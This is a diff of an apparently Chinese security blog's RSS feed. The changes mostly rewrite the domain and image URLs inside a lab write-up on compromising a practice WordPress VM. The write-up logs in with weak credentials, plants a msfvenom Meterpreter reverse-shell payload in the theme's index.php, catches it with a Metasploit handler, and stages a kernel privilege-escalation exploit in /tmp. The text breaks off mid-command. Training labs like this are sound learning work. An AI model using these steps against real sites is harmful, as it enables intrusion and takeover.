+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;cd&lt;/span&gt; /root&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ls&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;cat&lt;/span&gt; *&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230607203024465.png&#34; alt=&#34;image-20230607203024465&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这样就拿到第五个 flag 啦，成功拿到 root 权限，渗透结束&lt;/p&gt;
 &lt;h2 id=&#34;三-知识总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-知识总结&#34;&gt;#&lt;/a&gt; 三、知识总结&lt;/h2&gt;
 &lt;h4 id=&#34;主机扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主机扫描&#34;&gt;#&lt;/a&gt; 主机扫描&lt;/h4&gt;
@@ -528,70 +528,70 @@
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%20WordPress%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%20WordPress%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
             <title>记一次 WordPress 渗透测试</title>
-            <link>http://k1nako.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%20WordPress%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
-            <category term="靶场" scheme="http://k1nako.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
-            <category term="靶场复现" scheme="http://k1nako.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" />
+            <link>http://k1nakoo.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%20WordPress%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
+            <category term="靶场" scheme="http://k1nakoo.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
+            <category term="靶场复现" scheme="http://k1nakoo.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" />
             <pubDate>Sat, 03 Jun 2023 14:50:57 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;WordPress 渗透测试&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h2 id=&#34;搭建靶机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搭建靶机&#34;&gt;#&lt;/a&gt; 搭建靶机&lt;/h2&gt;
 &lt;p&gt;打开 vmware 虚拟机创建一个 ubuntu 的虚拟机&lt;/p&gt;
 &lt;p&gt;将硬盘移除，将靶机的虚拟磁盘添加进去启动即可&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603150311155.png&#34; alt=&#34;image-20230603150311155&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603150311155.png&#34; alt=&#34;image-20230603150311155&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h2&gt;
 &lt;p&gt;启动虚拟机后&lt;/p&gt;
 &lt;p&gt;这里我们不知道账号密码，将靶机的网段设置和 kali 相同 (NAT 模式)&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603150402100.png&#34; alt=&#34;image-20230603150402100&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603150402100.png&#34; alt=&#34;image-20230603150402100&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;通过 kali 的 &lt;code&gt;nmap&lt;/code&gt;  工具扫出此 ip 的网段和相关信息&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-Pn&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-sV&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;-65535 &lt;span class=&#34;token parameter variable&#34;&gt;--open&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603150803903.png&#34; alt=&#34;image-20230603150803903&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603151237068.png&#34; alt=&#34;image-20230603151237068&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-Pn&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-sV&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ip&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;-65535 &lt;span class=&#34;token parameter variable&#34;&gt;--open&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603150803903.png&#34; alt=&#34;image-20230603150803903&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603151237068.png&#34; alt=&#34;image-20230603151237068&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;扫到靶机开放了两个端口  &lt;code&gt;443 8080&lt;/code&gt;&lt;/p&gt;
 &lt;h2 id=&#34;漏洞检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞检测&#34;&gt;#&lt;/a&gt; 漏洞检测&lt;/h2&gt;
 &lt;p&gt;打开浏览器访问 &lt;code&gt;8080&lt;/code&gt;  端口，进到首页后，看到个很明显的  &lt;code&gt;Log in&lt;/code&gt;  关键词&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603151823868.png&#34; alt=&#34;image-20230603151823868&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603151823868.png&#34; alt=&#34;image-20230603151823868&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;点击后来到登陆界面，惯例简单弱口令试试水，试了几个弱口令没反应，  &lt;code&gt;admin&lt;/code&gt;   &lt;code&gt;123456&lt;/code&gt;  就进去了 (也可爆破)&lt;/p&gt;
 &lt;p&gt;进到了后台，开始找漏洞利用点&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603152402012.png&#34; alt=&#34;image-20230603152402012&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603152402012.png&#34; alt=&#34;image-20230603152402012&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h2&gt;
 &lt;p&gt;在  &lt;code&gt;Appearance/Editor&lt;/code&gt;  中发现很多 php 文件，可以尝试从中插入危险函数达到我们的目的&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603152859332.png&#34; alt=&#34;image-20230603152859332&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603152859332.png&#34; alt=&#34;image-20230603152859332&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;我们在  &lt;code&gt;index.php&lt;/code&gt;  插入个 phpinfo 并保存，浏览器打开新的标签页访问一遍首页查看代码是否执行&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;?php phpinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;?&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603153149249.png&#34; alt=&#34;image-20230603153149249&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;?php phpinfo&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;?&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603153149249.png&#34; alt=&#34;image-20230603153149249&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;执行成功！&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603153435312.png&#34; alt=&#34;image-20230603153435312&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603153435312.png&#34; alt=&#34;image-20230603153435312&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;(这个地方可以直接插入一句话 eval，直接 post 命令执行即可。这里不做演示&lt;/p&gt;
 &lt;p&gt;这里我们可以使用  &lt;code&gt;msfvenom&lt;/code&gt;  生成一个反弹 shell 文件，lhost 是 kali 本机 ip&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; php/meterpreter/reverse_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;lhost&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ip &lt;span class=&#34;token assign-left variable&#34;&gt;lport&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;port &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; raw&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;shell.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603154108841.png&#34; alt=&#34;image-20230603154108841&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msfvenom &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; php/meterpreter/reverse_tcp &lt;span class=&#34;token assign-left variable&#34;&gt;lhost&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ip &lt;span class=&#34;token assign-left variable&#34;&gt;lport&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;port &lt;span class=&#34;token parameter variable&#34;&gt;-f&lt;/span&gt; raw&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;shell.php&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603154108841.png&#34; alt=&#34;image-20230603154108841&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;将生成好的  &lt;code&gt;shell.php&lt;/code&gt;  里面的内容复制下来，插入到靶机  &lt;code&gt;index.php&lt;/code&gt;  配置文件里，(记得在结尾 &lt;code&gt;?&amp;gt;&lt;/code&gt;  闭合掉，以确保不会与下方的 php 代码冲突，然后保存 待定&lt;/p&gt;
 &lt;p&gt;利用  &lt;code&gt;msfconsole&lt;/code&gt;  工具实现反弹效果，lhost 是 kali 本机 ip&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; use exploit/multi/handler &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; Using configured payload generic/shell_reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 exploit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; show options &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Module options &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;exploit/multi/handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   Name  Current Setting  Required  Description&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   ----  ---------------  --------  -----------&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Payload options &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;generic/shell_reverse_tcp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   Name   Current Setting  Required  Description&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   ----   ---------------  --------  -----------&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   LHOST                   &lt;span class=&#34;token function&#34;&gt;yes&lt;/span&gt;       The listen address &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   LPORT  &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;             &lt;span class=&#34;token function&#34;&gt;yes&lt;/span&gt;       The listen port&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Exploit target:&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   Id  Name&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   --  ----&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;   Wildcard Target&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 exploit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; payload php/meterpreter/reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; php/meterpreter/reverse_tcp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 exploit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lhost &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.16.129&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lhost &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.16.129&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 exploit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;token number&#34;&gt;9999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;lport &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;9999&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;msf6 exploit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;multi/handler&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; run&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;设置完就运行，然后去访问一遍首页，就会反弹成功，输入 &lt;code&gt;shell&lt;/code&gt;  即可输入指令&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603155124776.png&#34; alt=&#34;image-20230603155124776&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603155124776.png&#34; alt=&#34;image-20230603155124776&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;发现当前是普通用户，需要进一步提权&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;uname -a&lt;/code&gt;  查看当前版本号&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;uname&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-a&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Linux Kiowizity &lt;span class=&#34;token number&#34;&gt;3.13&lt;/span&gt;.0-45-generic &lt;span class=&#34;token comment&#34;&gt;#74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;进入交互式&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603160852107.png&#34; alt=&#34;image-20230603160852107&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603160852107.png&#34; alt=&#34;image-20230603160852107&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;利用  &lt;code&gt;searchsploit&lt;/code&gt;  工具查找 3.13.0 版本的漏洞&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230603155736346.png&#34; alt=&#34;image-20230603155736346&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230603155736346.png&#34; alt=&#34;image-20230603155736346&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;searchsploit -p linux/local/37292.c&lt;/code&gt;  查看绝对路径&lt;/p&gt;
 &lt;p&gt;打开  &lt;code&gt;37292.c&lt;/code&gt;  里面会有教你如何使用此漏洞文件&lt;/p&gt;
 &lt;p&gt;将  &lt;code&gt;37292.c&lt;/code&gt;  里面的内容复制下来并 base64 加密&lt;/p&gt;
 &lt;p&gt;返回到靶机页面，利用 &lt;code&gt;file_put_contents&lt;/code&gt;  函数将加密好的 base64 写入进靶机内部&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;?php file_put_contents&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/tmp/123.c&#34;&lt;/span&gt;,base64_decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;加密内容&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;))&lt;/span&gt;?&lt;span class=&#34;token 